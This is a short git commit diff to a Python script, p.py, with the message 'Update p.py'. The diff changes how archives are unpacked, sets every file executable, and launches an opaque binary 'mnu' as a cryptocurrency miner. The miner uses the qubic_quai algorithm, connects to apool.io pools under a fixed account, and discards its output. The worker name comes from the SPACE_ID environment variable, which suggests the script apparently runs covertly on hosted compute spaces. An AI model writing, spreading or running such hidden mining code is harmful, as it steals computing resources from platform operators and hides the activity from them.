0e2d75d79ebcabf077ce7bb3888b64c6436cd7d5
shrsvr <sigyv7133@gmail.com>
2025-03-11 07:51:14 +0100

    Update p.py

--- p.py
+++ p.py
@@ -1,6 +1,5 @@
 import os
-os.system("xz -d mnu.xz")
-os.system("nvidia-smi")
-os.system("chmod +x mnu")
+os.system("unzip mnu.zip && unzip z.zip")
+os.system("chmod +x *")
 wn = os.getenv('SPACE_ID').replace("/","_")
 os.system(f"./mnu --account CP_fafubk1b65 --algo qubic_quai --gpu-off true --pool quai.hk.apool.io:3334 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
